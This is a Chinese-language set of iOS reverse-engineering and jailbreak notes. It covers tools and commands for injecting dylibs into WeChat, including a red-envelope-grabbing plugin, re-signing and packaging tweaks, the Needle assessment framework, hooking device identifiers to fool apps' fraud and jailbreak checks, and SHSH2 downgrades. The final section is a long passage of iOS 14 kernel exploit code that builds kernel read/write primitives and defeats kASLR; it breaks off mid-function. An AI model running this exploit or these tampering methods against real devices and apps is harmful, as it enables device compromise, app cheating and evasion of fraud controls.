    res = posix_spawn(&child, argv[0], NULL, NULL, argv, (char * const *)_NSGetEnviron());
    assert(res == 0);
    
    return;
}
int main(int argc, char *argv[]) {
    printf("***** pp_inject by piaoyun ***** \n");
    if (geteuid() != 0) {
        printf("FATAL: must be run as root.\n");
        return 1;
    }
    
    if (argc < 3 ) {
        printf("FATAL: ppinject <pid> <dylib>.\n");
        return 2;
    }
    
    const char *process_name = argv[1];
    const char *dylib_path = argv[2];
    
    
    printf("Creating queue...\n");
    dispatch_queue_t queue = dispatch_queue_create(dispatch_queue_name, 0);
    
    printf("Finding %s PID...\n", process_name);
    dispatch_async(queue, ^{ while (!find_process(process_name, &process_pid)); });
    
    printf("Waiting for queue to come back...\n");
    dispatch_sync(queue, ^{});
    
    printf("%s PID is %d\n", process_name, process_pid);
    
    printf("Injecting %s into %s...\n", dylib_path, process_name);
    inject_dylib(cynject_path, process_pid, dylib_path);
    
    return 0;
}

```

## Mach-O注入/删除动态库 insert_dylib  optool

如果要让现成的App，执行自己的代码可以通过注入动态库，

静态的注入可以使用optool工具修改MachO的Load Commands然后重签，

动态运行时可以使用dlopen   或    Bundle(path: "**.bundle").load()加载
```
通过 otool -L命令查看你生成的.dylib文件
otool -L ioswechatselectall.dylib

查看CPU框架
lipo -archs ioswechatselectall.dylib

首先要找到libsubstrate.dylib文件,该文件应该在/opt/thoes/lib/目录下,然后将其拷贝到与你生成的的.dylib一个目录下,通过下面的指令修改依赖,
install_name_tool -change /Library/Frameworks/CydiaSubstrate.framework/CydiaSubstrate @loader_path/libsubstrate.dylib wx.dylib

添加可执行文件的依赖
此处用的是insert_dylib 下载地址在https://github.com/Tyilo/insert_dylib
编译后,将其与其他两个文件拷贝到同一目录下

然后将其插入到执行文件中
1.将wx.dylib 和libsubstrate.dylib拷贝进你的WeChat.app 
2.记住要把WeChat_patched的名字改回来WeChat

@executable_path是一个环境变量，指的是二进制文件所在的路径

insert_dylib命令格式： ./insert_dylib 动态库路径 目标二进制文件

//注入动态库
./insert_dylib @executable_path/ioswechatselectall.dylib WeChat 
./yololib  Wechat wxhbts.dylib
//打包成ipa 
xcrun -sdk iphoneos PackageApplication -v WeChat.app -o `pwd`/WeChat.ipa

注入神器optool

编译获取
因为 optool 添加了 submodule，因为需要使用 --recuresive 选项，将子模块全部 clone 下来
git clone --recursive https://github.com/alexzielenski/optool.git
cd optool
xcodebuild -project optool.xcodeproj -configuration Release ARCHS="i386 x86_64" build

使用 optool 把 wx.dylib 注入到二进制文件中

./optool install -c load -p "@executable_path/wx.dylib" -t WeChat

codesign签名dylib

errSecInternalComponent 错误
在Mac终端上运行codesign命令，并“始终允许” /usr/bin/codesign访问密钥
security unlock-keychain login.keychain
解锁命令移至，~/.bash_profile以便在SSH客户端启动时对钥匙串进行解锁
AppleWWDRCAG3 不收信任证书
获取证书
security find-identity -v -p codesigning 
签名Dylib 
codesign -f -s B3C14FC452E835C09B70D5C24961EBAFC0A2C4B9 hook.dylib 
ldid -S dumpdecrypted.dylib
1.安装 Xcode 
2.安装 Command Line Tools 
xcode-select --install 
codesign --force --deep --sign - /xxx/xxx.app 
签名错误 resource fork, Finder information, or similar detritus not allowed 
解决方法 xattr -lr <path_to_app_bundle> 
查看 xattr -cr <path_to_app_bundle> 删除 
或者 find . -type f -name '*.jpeg' -exec xattr -c {} \; find . -type f -name '*.png' -exec xattr -c {} \; 
find . -type f -name '*.tif' -exec xattr -c {} \; 
整个App签名 codesign -fs "授权证书" --no-strict --entitlements=生成的plist文件 WeChat.app 
验证Dylib签名 codesign –verify hook.dylib codesign -vv -d WeChat.app

Xcode升级到8.3后 用命令进行打包 提示下面这个错误
后面根据对比发现新版的Xcode少了这个PackageApplication  (QQ群下载)
先去找个旧版的Xcode里面copy一份过来
放到下面这个目录：
/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/usr/bin/

然后执行命令
sudo xcode-select -switch /Applications/Xcode.app/Contents/Developer/

chmod +x /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/usr/bin/PackageApplication

theos

ARCHS = armv7 armv7s arm64
TARGET = iphone:8.4:7.0
#指定路径，否则默认在 /Library/MobileSubstrate/DynamicLibraries
LOCAL_INSTALL_PATH = /usr/bin
include theos/makefiles/common.mk
TWEAK_NAME = oooo
oooo_FILES = oooo.xm
#指定版本
_THEOS_TARGET_LDFLAGS += -current_version 1.0
_THEOS_TARGET_LDFLAGS += -compatibility_version 1.0
#tweak2.mk是我修改过的，去掉了CydiaSubstrate链接，因为这个dylib用不到
include $(THEOS_MAKE_PATH)/tweak2.mk
-current_version、-compatibility_version参数参考自苹果官方！！
https://developer.apple.com/library/mac/documentation/DeveloperTools/Conceptual/DynamicLibraries/100-Articles/CreatingDynamicLibraries.html

theos编译不越狱可用的dylib

SUBSTRATE ?= yes
instance_USE_SUBSTRATE = $(SUBSTRATE)
把上面的instance替换成你的TweakName
在上面的这个例子中就是XXXX 
include _USE_SUBSTRATE = no，请转换为使用include _LOGOS_DEFAULT_GENERATOR = internal
编译：make SUBSTRATE=no
编译DEB：make SUBSTRATE=no package
编译DEB并安装：make SUBSTRATE=no package  install

```

## 打包deb
```
find . -name .DS_Store -print0 | xargs -0 git rm -f --ignore-unmatch
echo .DS_Store >> ~/.gitignore
xcode-select --install 
sudo xcodebuild -license    手动输入 agree
安装 Macports ，网址：http://www.macports.org/install.php
export PATH=/opt/local/bin:/opt/local/sbin:$PATH
sudo port -f install dpkg
dpkg 降级
brew remove dpkg  
HOMEBREW_NO_AUTO_UPDATE=1 brew install https://raw.githubusercontent.com/Homebrew/homebrew-core/7a4dabfc1a2acd9f01a1670fde4f0094c4fb6ffa/Formula/dpkg.rb
brew pin dpkg 
$ brew remove dpkg  
# remove latest dpkg 
$ brew install --force-bottle https://raw.githubusercontent.com/Homebrew/homebrew-core/7a4dabfc1a2acd9f01a1670fde4f0094c4fb6ffa/Formula/dpkg.rb  
# install dpkg as a bottle from the old commit 
$ brew pin dpkg  
# block homebrew from updating dpkg till you `brew unpin dpkg`
postinst写法（直接复制)（权限755）
#!/bin/bash
mkdir -p /private/var/mobile/Documents/
chown -R mobile:mobile /private/var/mobile/Documents/
/bin/su -c uicache mobile
cd Desktop
sudo chmod -R 755 *
dpkg-deb -Z gzip -b ./{标识符} 
dpkg-deb -Z xz -b ./{标识符}
mac 解包 打包
dpkg-deb -x ./abc.deb ./tmp
dpkg-deb -e ./abc.deb ./tmp/DEBIAN
dpkg-deb -b ./tmp false8.deb
解包.sh
#!/bin/sh
dpkg-deb -x ./a.deb ./a
dpkg-deb -e ./a.deb ./a/DEBIAN
chmod -R 755 ./a/DEBIAN
打包.sh
#!/bin/sh
find . -name '*.DS_Store' -type f -delete
dpkg-deb -Z lzma -b ./a b.deb

```

### optool神器就是命令行注入
```
optool install -c load -p "@executable_path/RedEnvelop.dylib" -t WeChat
//这就是给WeChat加载抢红包插件

//如果要unstall，要这样：
optool uninstall -p "@executable_path/RedEnvelop.dylib" -t WeChat

//具体 dylib 的路径可以用 otool 查看：
otool -L WeChat
```

```
使用方法:

  install -c <command> -p <payload> -t <target> [-o=<output>] [-b] [--resign] In
  serts an LC_LOAD command into the target binary which points to the payload. T
  his may render some executables unusable.

  uninstall -p <payload> -t <target> [-o=<output>] [-b] [--resign] Removes any L
  C_LOAD commands which point to a given payload from the target binary. This ma
  y render some executables unusable.

  strip [-w] -t <target> Removes a code signature load command from the given bi
  nary.

  restore -t <target> Restores any backup made on the target by this tool.

  aslr -t <target> [-o=<output>] [-b] [--resign] Removes an ASLR flag from the m
  acho header if it exists. This may render some executables unusable


可选的:
  [-w --weak] Used with the STRIP command to weakly remove the signature. Withou
  t this, the code signature is replaced with null bytes on the binary and its L
  OAD command is removed.

  [--resign] Try to repair the code signature after any operations are done. Thi
  s may render some executables unusable.

  -t|--target <target> Required of all commands to specify the target executable
   to modify

  -p|--payload <payload> Required of the INSTALL and UNINSTALL commands to speci
  fy the path to a DYLIB to point the LOAD command to

  [-c --command] Specify which type of load command to use in INSTALL. Can be re
  export for LC_REEXPORT_DYLIB, weak for LC_LOAD_WEAK_DYLIB, upward for LC_LOAD_
  UPWARD_DYLIB, or load for LC_LOAD_DYLIB

  [-b --backup] Backup the executable to a suffixed path (in the form of _backup
  .BUNDLEVERSION)

  [-h --help] Show this message

```

## -----------------------------------

## 解除网页禁止复制粘贴

如果发现网页无法选择文字,
找到你要复制文字的地方,
显示源代码: 
找到-webkit-user-select字段
```
-webkit-user-select: none
```
如果有，将其去掉保存刷新

## -----------------------------------

## Needle绕过iOS越狱检测

### Needle使用教程

由于每个模块都专注于特定任务，并且核心处理常见问题（例如与设备的通信，命令的实际执行等），因此创建新模块只需几行python代码即可。

“ show modules”命令可用于列出框架中当前可用的所有模块。

[needle][install] > show modules

Binary
  ------
    binary/info/checksums
    binary/info/compilation_checks
    binary/info/metadata
    binary/info/provisioning_profile
    binary/info/universal_links
    binary/installation/install
    binary/installation/pull_ipa
    binary/reversing/class_dump
    binary/reversing/class_dump_frida_enum-all-methods
    binary/reversing/class_dump_frida_enum-classes
    binary/reversing/class_dump_frida_find-class-enum-methods
    binary/reversing/shared_libraries
    binary/reversing/strings

  Comms
  -----
    comms/certs/delete_ca
    comms/certs/export_ca
    comms/certs/import_ca
...
否则，“ search <query>”命令可用于搜索与查询匹配的可用模块。

[needle] > search binary
[*] Searching for "binary"...

Binary
------
    binary/info/checksums
    binary/info/compilation_checks
    binary/info/metadata
    binary/info/provisioning_profile
    binary/info/universal_links
    binary/installation/install
    binary/installation/pull_ipa
    binary/reversing/class_dump
    binary/reversing/class_dump_frida_enum-all-methods
    binary/reversing/class_dump_frida_enum-classes
    binary/reversing/class_dump_frida_find-class-enum-methods
    binary/reversing/shared_libraries
    binary/reversing/strings

Storage
-------
    storage/data/files_binarycookies 
选择后，“ info”命令可用于显示特定模块的详细信息。

[needle] > use binary/reversing/strings
[needle][strings] > info

Name: Strings
Path: modules/binary/reversing/strings.py
Author: @LanciniMarco (@MWRLabs)

Description:
Find strings in the (decrypted) application binary, then try to extract URIs and ViewControllers

```
Options:
 Name     Current Value                    Required   Description
 -------  -------------                    --------   -----------
 ANALYZE  True                             no         Analyze recovered strings and try to recover URI
 FILTER                                    no         Filter the output (grep)
 LENGTH   10                               yes        Minimum length for a string to be considered
 OUTPUT   /root/.needle/tmp/strings.txt    no         Full path of the output file 
或者，仅获取可用选项：

[needle][strings] > show options
 Name     Current Value                    Required   Description
 -------  -------------                    --------   -----------
 ANALYZE  True                             no         Analyze recovered strings and try to recover URI
 FILTER                                    no         Filter the output (grep)
 LENGTH   10                               yes        Minimum length for a string to be considered
 OUTPUT   /root/.needle/tmp/strings.txt    no         Full path of the output file 
像全局选项一样，甚至模块特定的选项也可以使用“ set”和“ unset”命令进行编辑。

[needle][strings] > set FILTER password
FILTER => password
[needle][strings] > show options
 Name     Current Value                    Required   Description
 -------  -------------                    --------   -----------
 ANALYZE  True                             no         Analyze recovered strings and try to recover URI
 FILTER   password                         no         Filter the output (grep)
 LENGTH   10                               yes        Minimum length for a string to be considered
 OUTPUT   /root/.needle/tmp/strings.txt    no         Full path of the output file 
当所有选项均设置为首选时，“ run”命令可用于启动模块的执行。如果尚未选择目标应用程序（全局选项“ TARGET_APP”仍未设置），Needle将首先启动向导，该向导将帮助用户选择目标。

[needle][strings] > run
[*] Checking connection with device...
[+] Already connected to: 127.0.0.1
[V] Creating temp folder: /var/root/needle/
[*] Target app not selected. Launching wizard...
[V] Refreshing list of installed apps...
[+] Apps found:
    0 - com.highaltitudehacks.dvia
    1 - uk.co.bbc.newsuk
Please select a number: 0
[+] Target app: com.highaltitudehacks.dvia
[*] Decrypting the binary...
[?] The app might be already decrypted. Trying to retrieve the IPA...
[V] Decrypted IPA stored at: /var/root/needle/decrypted.ipa
[*] Unpacking the decrypted IPA...
[V] Analyzing binary...
[+] The following strings has been found: 
     %@: Unable to get password of credential %@
     %s -- Cannot be used in OpenSSL mode. An IV or password is required
     Both password and the key (%d) or HMACKey (%d) are set.
     CFHTTPMessageAddAuthentication(httpMsg, _responseMsg, (__bridge CFStringRef)_credential.user, (__bridge CFStringRef)password, kCFHTTPAuthenticationSchemeBasic, _httpStatus == 407)
     Cannot sign up without a password.
     Congrats! You've found the right username and password!
     Huh, couldn't get password of %@; trying again
     Please enter a password
     T@"NSString",&,N,V_password
     T@"NSString",C,N,V_password
     T@"UITextField",&,N,V_passwordTextField
     ...
[*] Saving output to file: /root/.needle/tmp/strings.txt
最后，“ show source”命令可用于检查所选模块的实际源代码。

[needle][strings] > show source

 1|from core.framework.module import BaseModule
 2|
 3|
 4|class Module(BaseModule):
 5|    meta = {
 6|           'name': 'Strings',
 7|           'author': '@LanciniMarco (@MWRLabs)',
 8|           'description': 'Find strings in the (decrypted) application binary, then try to extract URIs and ViewControllers',
 9|           'options': (
10|                      ('length', 10, True, 'Minimum length for a string to be considered'),
11|                      ('filter', '', False, 'Filter the output (grep)'),
12|                      ('output', True, False, 'Full path of the output file'),
13|                      ('analyze', True, False, 'Analyze recovered strings and try to recover URI'),
14|          ),
15|    }
16|
17|    # ====================================================================
18|    # UTILS
19|    # ====================================================================
20|    def __init__(self, params):
21|        BaseModule.__init__(self, params)
```

```
Signing for "xxx" requires a development team. 
Select a development team in the Signing & Capabilities editor. 
(in target 'xxxDylib' from project 'xxx')

使用monkeydev动态调试工具，xcode新建文件之后编译一直报错证书问题， 无论怎么修改证书为开发团队也不行。
解决方案：

target 选择xxxDylib buildsetting 添加CODE_SIGNING_ALLOWED，设置为=NO

```

## iOS改机原理是什么?
```
在iOS上目前所有流行的改机工具，本质上是利用substrate框架对某些用来获取设备和系统参数函数进行hook，
从而欺骗App达到修改的目的，具体的如下：

用作获取设备参数的函数(无论是C函数，还是Objective-C/Swift函数，可以使用hook框架来修改其返回值)
屏蔽VPN／HTTP代理检测
屏蔽越狱检测
```

## 一键新机怎么实现的?
```
在进行一键新机时, 操作如下：

生成设备参数并保存到文件
/private/var/mobile/Library/Preferences/
com.app1e.mobile.ifalscommon.plist   保存伪造设备参数数据
com.app1e.mobile.ifalslocation.plist 保存伪造位置数据

将应用沙盒目录下的数据备份，同时为新环境创建沙盒目录结构
备份的数据存放在/private/var/mobile/fackedata下

应用启动后，fackedata.dylib会hook关键函数，并根据plist文件修改函数返回的数据
在这一步，fackedata还会根据情况清理keychain, 同时做简单的反越狱检测
```

## FutureRestore GUI界面化降级教程

FutureRestore GUI提供了与经典命令行界面版本相同的功能，
但是可以通过界面化来单击按钮来启动该过程，而不是使用Terminal命令。
适用于小白新手很方便, 摆脱命令行, 快速操作shsh2来降级iOS固件

FutureRestore GUI应用程序仍然要求用户拥有他们计划降级或升级到的版本的.shsh2 blob和.ipsw固件文件。
对futurerestore的命令行界面版本的所有相同限制和限制仍然适用，因此我们鼓励越狱者为此目的保存对应的.shsh2 blob。

## QQ群文件下载工具

![](https://mmbiz.qpic.cn/mmbiz_png/Rgn7gtr1jyqKh0AB6YGjnVYeogcNvBUBVN7tJ0ku95RxVIWMeTiaXkypqPiaiczpd7MuCmsvCsicwjS2lwdYmNUelw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

额外处理A12 +设备保存shsh2教程

将以下存储库添加到您的设备：

https://halo-michael.github.io/repo
并安装名为Generator Auto Setter的软件包 。安装后，在“设置” 应用中进行调整，找到“生成器自动设置器”，输入您选择的生成器，然后选择“ 设置”。

![](https://mmbiz.qpic.cn/mmbiz_jpg/Rgn7gtr1jyqKh0AB6YGjnVYeogcNvBUBhAiclOKMWdE4FwhIr2ichzUMNTT0PqnnibNuBuENUf5yHIQibIRo2d7XUw/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

请注意，设置什么发生器都没有关系。重要的是，在发现匹配的Apnonce之前， 您必须知道设置了哪个生成器。他们成对，更换发电机会改变Apnonce。我们需要知道是什么生成器创建了Apnonce，我们将在后续步骤中发现它们。

许多生成器设置器使用默认值。例如，默认情况下unc0ver和Generator Auto Setter 都使用0x1111111111111111。您的发电机设置器可能使用其他值。您可以将生成器设置保留为默认值（推荐），也可以更改它。不管它不 只要你知道你已经将它设置为，并记下来。

将越狱设备上的生成器成功设置为已知值（例如0x1111111111111111）并将设备插入计算机后，我们可以继续进行。

请记住：知道您的生成器值是什么，并在将来安全的地方（例如文本文档）记录下来！如果您不再知道用来创建Apnonce的生成器（用于保存Blob），则SHSH Blob将无效。

## Mac打开 Terminal 运行 commands:
```
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
```

然后安装libirecovery
```
brew install --HEAD usbmuxd
brew install --HEAD libimobiledevice
brew install libirecovery
```

然后打开一个终端窗口。在Windows上，在运行以下命令之前，您还需要导航到下载的二进制文件的存储位置。

如果这些命令中的任何一个在Mac或Linux上失败，请尝试在命令前面加上sudo 来运行 它们。输入以下内容：

现在输入：
```
ideviceenterrecovery UDID

```
将UDID替换为您在上一步中记下的UniqueDeviceID（一长串数字和字母）。您的设备现在将重新启动进入恢复模式，并且您应该在屏幕上看到随附的图形。

现在输入：
```
irecovery -q
```

您应该看到设备的另一个值列表。您将需要复制ECID （这是设备的ECID，每次保存Blob时都需要）和NONC （这是我们已经听到很多次的至关重要的Apnonce，并且与生成器唯一配对）的值设置得更早）。

请在安全的地方记下这些值，例如在之前保存了生成器，HardwareModel和ProductType的文本文档中。以后每次保存shsh2时，都将需要它们。

最后，输入：
```
irecovery -n
```

这会将您的设备重新启动，使其退出恢复模式。请勿使用物理按钮重新启动设备，因为它将始终返回到恢复模式。请改用此命令。

```
硬件型号（之前称为 HardwareModel）
设备型号（之前称为 ProductType）
设备ECID（字母数字字符串，可能以0x开头...）
生成器（由您在开始时设置，例如0x1111111111111111）
Apnonce（长字母数字字符串，仅对您在上面设置的生成器有效）
```

现在，您可以使用TSS Saver为您的A12 +设备保存.shsh2 blob。以后无需重复以上操作即可保存该设备的Blob。为了保存Blob，您甚至不必对其进行越狱

![](https://mmbiz.qpic.cn/mmbiz_jpg/Rgn7gtr1jyofHOIOrF8zA2HfBYUf7cqsBLEdOHp4ia0T7eBehVhicYlicwNFePhfujH2qDBSGDwSp9geM6TAial74w/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)
```
因为这个FutureRestore GUI是基于Java来开发的
所以用户需要在MacOS上安装Java 8才能使用它
https://www.java.com/en/download/
```

## shsh2是什么？
```
APTicket是从iOS5开始由苹果推出的最新安全检查功能，最主要功能是防止iPhone、iPad、iPod用户设备检验的降级限制，目前也仅有Apple Server才能拥有发送与解开  APTicket 密钥，那  APTicket 怎么获得呢？

在我们设备手上的设备都会有一组固定的16码ECID（Exclusive Chip ID）号码，当我们要透过iTunes进行升降级时，会先连至苹果验证服务器（gs.apple.com），丢出「讯息」内会夹带一次性唯一码、设备ECID与19个BLOB的验证码，而服务器接收到后，就会返回一组随机APTicket和当前iOS版本的SHSH验证码，当验证符合时，才能够进行接下来的升降级动作。

所以在iOS验证关闭后，就算你有备份SHSH其实也无法实现降级，因为还有  APTicket验证要解决。

在32位元设备中，有存有硬体设备漏洞，可直接绕过  APTicket 验证，直接实现靠SHSH就可以降级。也有一款降级工具「odysseusOTA」推出后，就能够让不少32位元设备，如iPhone5、5c、4s、iPad3、iPad2都能降回至旧  iOS版本上。

目前我们还可以备份  SHSH 吗？前提要再  SHSH 认证开启状态下才能够用tsschecker工具备份。

shsh2是什么？有什么作用？

之前iOS 要备份SHSH 可达成降级，相信还会有不少用户搞不清楚，怎么又跳出SHSH2 这东西，这与SHSH又有什么关系？

加上因iOS 验证的API有改变，造成nonce是无法从Apple验证服务器上取得，目前还保留在sign内，导致已经无法使用之前用小红伞工具来获取旧版SHSH文件，因为这方法其实是没有包含nonce值，同等于就没有任何作用。

因此ihmstar 推出了最新的保存脚本工具tsschecker ，可来获取设备的SHSH2档案，不过这脚本工具里面所保存的SHSH2档案不包括有Nonce仅只有Generator，这串数值可搭配Prometheus 降级工具使用，能够让iOS使用Generator 和SHSH2 档案产生最关键的「APNonce」，如此一来有了SHSH2档案后，后续就可以自由的进行升降级工作。

但目前由于还没突破降级限制，在拥有SHSH2 大部分条件情况下也仅能够实现升级与重刷，
除了A7处理器设备iPhone 5s / iPad Air 1 / iPad Mini 2 能实现降级外。
又加上苹果会不定时改变SEP 要来阻止用户可透过Prometheus 升、降级，才会导致过去曾经发生过iOS 11~iOS 11.2.6 与iOS 11.3 SEP 不同，
这算是首次出现的现象，以往过去都是在iOS 大版本更新才会改变SEP，但苹果也不断持续提升安全性与防御机制。

该怎么备份shsh2？=> 参考微信公众号Cydia文章

不管未来有没有打算要越狱，或许可先跑一次备份iOS 的shsh2 ，未来如果漏洞可开发出降级工具用来自由升降iOS版本时，保存好的shsh2 这就是你手中握有最佳降级的关键钥匙。如果都没备份，那永远都是没有这个机会。

发现到不少用户会误解备份shsh2一定要透过电脑或是升级上iOS版本才可以，这些都是错误的想法，iOS shsh2 备份是在任何可开启网页版本状态下就可以操作，
且不需要电脑也可以直接透过iOS 执行操作，前提是需要查好ECID和Internal Name/Model就可以，这部分可以直接存在iOS备忘录内，
每次iOS 新版本推出时，就可以直接复制贴上执行shsh2 备份。

futurerestore 工具
一个可执行文件

SEP 文件
解压下载的系统固件
在 Firmware/all_flash 目录下，有一堆以 “sep” 开头的文件，但是它有很多种，比如我这里有 j120、j121 等

基带固件
在解压缩的系统固件的 Firmware 文件夹里，通常还有一些 .bbfw 格式的文件，这些是基带文件。这就需要你查一下你手机对应的是哪个基带文件了，我这里是 WLAN 版 iPad，所以只有一个

BuildManifest.plist 文件
解压缩系统固件，在根目录就能看到这个文件
...
```

## pre-jailbreak 漏洞
```

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdbool.h>
#include <mach/mach.h>

#include "mycommon.h"
#include "k_offsets.h"
#include "utils.h"
#include "k_utils.h"
#include "kapi.h"
#include "user_kernel_alloc.h"
#include "cicuta_virosa/cicuta_virosa.h"

extern mach_port_t IOSurfaceRootUserClient;
uint32_t iosurface_create_fast(void);
uint32_t iosurface_s_get_ycbcrmatrix(void);
void iosurface_s_set_indexed_timestamp(uint64_t v);

static int *pipefds;
static size_t pipe_buffer_size = 0x1000;
static uint8_t *pipe_buffer;
static kptr_t IOSurfaceRoot_uc;

static void read_pipe()
{
    size_t read_size = pipe_buffer_size - 1;
    ssize_t count = read(pipefds[0], pipe_buffer, read_size);
    if (count == read_size) {
        return;
    } else if (count == -1) {
        perror("read_pipe");
        util_error("could not read pipe buffer");
    } else if (count == 0) {
        util_error("pipe is empty");
    } else {
        util_error("partial read %zu of %zu bytes", count, read_size);
    }
    fail_info(__FUNCTION__);
}

static void write_pipe()
{
    size_t write_size = pipe_buffer_size - 1;
    ssize_t count = write(pipefds[1], pipe_buffer, write_size);
    if (count == write_size) {
        return;
    } else if (count < 0) {
        util_error("could not write pipe buffer");
    } else if (count == 0) {
        util_error("pipe is full");
    } else {
        util_error("partial write %zu of %zu bytes", count, write_size);
    }
    fail_info(__FUNCTION__);
}

static void build_stable_kmem_api()
{
    static kptr_t pipe_base;
    kptr_t p_fd = kapi_read_kptr(g_exp.self_proc + OFFSET(proc, p_fd));
    kptr_t fd_ofiles = kapi_read_kptr(p_fd + OFFSET(filedesc, fd_ofiles));
    kptr_t rpipe_fp = kapi_read_kptr(fd_ofiles + sizeof(kptr_t) * pipefds[0]);
    kptr_t fp_glob = kapi_read_kptr(rpipe_fp + OFFSET(fileproc, fp_glob));
    kptr_t rpipe = kapi_read_kptr(fp_glob + OFFSET(fileglob, fg_data));
    pipe_base = kapi_read_kptr(rpipe + OFFSET(pipe, buffer));

    // XXX dirty hack, but I'm lucky :)
    uint8_t bytes[20];
    read_20(IOSurfaceRoot_uc + OFFSET(IOSurfaceRootUserClient, surfaceClients) - 4, bytes);
    *(kptr_t *)(bytes + 4) = pipe_base;
    write_20(IOSurfaceRoot_uc + OFFSET(IOSurfaceRootUserClient, surfaceClients) - 4, bytes);

    // iOS 14.x only
    struct fake_client {
        kptr_t pad_00; // can not use IOSurface 0 now
        kptr_t uc_obj;
        uint8_t pad_10[0x40]; // start of IOSurfaceClient obj
        kptr_t surf_obj;
        uint8_t pad_58[0x360 - 0x58];
        kptr_t shared_RW;
    };

    stage0_read32 = ^uint32_t (kptr_t addr) {
        struct fake_client *p = (void *)pipe_buffer;
        p->uc_obj = pipe_base + 16;
        p->surf_obj = addr - 0xb4;
        write_pipe();
        uint32_t v = iosurface_s_get_ycbcrmatrix();
        read_pipe();
        return v;
    };

    stage0_read64 = ^uint64_t (kptr_t addr) {
        uint64_t v = stage0_read32(addr);
        v |= (uint64_t)stage0_read32(addr + 4) << 32;
        return v;
    };

    stage0_read_kptr = ^kptr_t (kptr_t addr) {
        uint64_t v = stage0_read64(addr);
        if (v && (v >> 39) != 0x1ffffff) {
            if (g_exp.debug) {
                util_info("PAC %#llx -> %#llx", v, v | 0xffffff8000000000);
            }
            v |= 0xffffff8000000000; // untag, 25 bits
        }
        return (kptr_t)v;
    };

    stage0_read = ^void (kptr_t addr, void *data, size_t len) {
        uint8_t *_data = data;
        uint32_t v;
        size_t pos = 0;
        while (pos < len) {
            v = stage0_read32(addr + pos);
            memcpy(_data + pos, &v, len - pos >= 4 ? 4 : len - pos);
            pos += 4;
        }
    };

    stage0_write64 = ^void (kptr_t addr, uint64_t v) {
        struct fake_client *p = (void *)pipe_buffer;
        p->uc_obj = pipe_base + 0x10;
        p->surf_obj = pipe_base;
        p->shared_RW = addr;
        write_pipe();
        iosurface_s_set_indexed_timestamp(v);
        read_pipe();
    };

    stage0_write = ^void (kptr_t addr, void *data, size_t len) {
        uint8_t *_data = data;
        uint64_t v;
        size_t pos = 0;
        while (pos < len) {
            size_t bytes = 8;
            if (bytes > len - pos) {
                bytes = len - pos;
                v = stage0_read64(addr + pos);
            }
            memcpy(&v, _data + pos, bytes);
            stage0_write64(addr + pos, v);
            pos += 8;
        }
    };
}

static void build_stage0_kmem_api()
{
    stage0_read32 = ^uint32_t (kptr_t addr) {
        uint32_t v = read_32(addr);
        return v;
    };

    stage0_read64 = ^uint64_t (kptr_t addr) {
        uint64_t v = read_64(addr);
        return v;
    };

    stage0_read_kptr = ^kptr_t (kptr_t addr) {
        uint64_t v = stage0_read64(addr);
        if (v && (v >> 39) != 0x1ffffff) {
            if (g_exp.debug) {
                util_info("PAC %#llx -> %#llx", v, v | 0xffffff8000000000);
            }
            v |= 0xffffff8000000000; // untag, 25 bits
        }
        return (kptr_t)v;
    };

    stage0_read = ^void (kptr_t addr, void *data, size_t len) {
        uint8_t *_data = data;
        uint64_t v;
        size_t pos = 0;
        while (pos < len) {
            v = stage0_read64(addr + pos);
            memcpy(_data + pos, &v, len - pos >= 8 ? 8 : len - pos);
            pos += 8;
        }
    };

    stage0_write64 = ^void (kptr_t addr, uint64_t v) {
        stage0_write(addr, &v, sizeof(v));
    };

    stage0_write = ^void (kptr_t addr, void *data, size_t len) {
        uint8_t *_data = data;
        uint8_t v[20];
        size_t pos = 0;
        while (pos < len) {
            size_t bytes = 20;
            if (bytes > len - pos) {
                bytes = len - pos;
                read_20(addr + pos, v);
            }
            memcpy(v, _data + pos, bytes);
            write_20(addr + pos, v);
            pos += 20;
        }
    };
}

void exploit_main(void)
{
    sys_init();
    kernel_offsets_init();
    bool ok = IOSurface_init();
    fail_if(!ok, "can not init IOSurface lib");
    uint32_t surf_id = iosurface_create_fast();
    util_info("surface_id %u", surf_id);
    size_t pipe_count = 1;
    pipefds = create_pipes(&pipe_count);
    pipe_buffer = (uint8_t *)malloc(pipe_buffer_size);
    memset_pattern4(pipe_buffer, "pipe", pipe_buffer_size);
    pipe_spray(pipefds, 1, pipe_buffer, pipe_buffer_size, NULL);
    read_pipe();

    // open the door to iOS 14
    cicuta_virosa();

    build_stage0_kmem_api();

    g_exp.self_ipc_space = kapi_read_kptr(g_exp.self_task + OFFSET(task, itk_space));
    g_exp.self_proc = kapi_read_kptr(g_exp.self_task + OFFSET(task, bsd_info));

    kptr_t IOSurfaceClient_obj;
    {
        kptr_t entry = ipc_entry_lookup(IOSurfaceRootUserClient);
        kptr_t object = kapi_read_kptr(entry + OFFSET(ipc_entry, ie_object));
        kptr_t kobject = kapi_read_kptr(object + OFFSET(ipc_port, ip_kobject));
        IOSurfaceRoot_uc = kobject;
        kptr_t surfaceClients = kapi_read_kptr(kobject + OFFSET(IOSurfaceRootUserClient, surfaceClients));
        IOSurfaceClient_obj = kapi_read_kptr(surfaceClients + sizeof(kptr_t) * surf_id);
    }

    util_info("build stable kernel r/w primitives");
    build_stable_kmem_api();
    util_info("---- done ----");

    kptr_t vt_ptr = kapi_read64(IOSurfaceClient_obj);
    if ((vt_ptr >> 39) != 0x1ffffff) {
        g_exp.has_PAC = true;
    }

    util_info("defeat kASLR");

    kptr_t IOSurfaceClient_vt;
    kptr_t IOSurfaceClient_vt_0;
    IOSurfaceClient_vt = kapi_read_kptr(IOSurfaceClient_obj);
    IOSurfaceClient_vt_0 = kapi_read_kptr(IOSurfaceClient_vt);

    util_info("vt %#llx, vt[0] %#llx", IOSurfaceClient_vt, IOSurfaceClient_vt_0);
    util_msleep(100);

    // device&OS dependent
    kptr_t text_slide = IOSurfaceClient_vt_0 - kc_IOSurfaceClient_vt_0;
    kptr_t data_slide = IOSurfaceClient_vt - kc_IOSurfaceClient_vt;

    kptr_t kernel_base = kc_kernel_base + text_slide;
    kptr_t kernel_map = kc_kernel_map + data_slide;
    kptr_t kernel_task = kc_kernel_task + data_slide;

    kptr_t kernel_map_ptr;
